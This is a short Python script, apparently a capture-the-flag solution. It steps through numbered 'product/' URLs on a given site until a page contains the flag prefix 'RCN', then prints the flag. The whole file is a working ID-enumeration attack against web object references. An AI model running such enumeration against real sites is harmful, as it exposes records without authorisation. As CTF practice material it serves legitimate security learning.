#!/usr/bin/env python3
import sys
import requests

url = sys.argv[1]

flag = False
count = 0
while flag == False:
	trueUrl = url + 'product/' + str(count)
	r = requests.get(trueUrl)
	if 'RCN' not in r.text:
 		count +=1
	else:
 		flag = True

flag_startIndex = r.text.find('RCN')
flag_endIndex = r.text.find('}', flag_startIndex)
print(r.text[flag_startIndex:flag_endIndex+1])
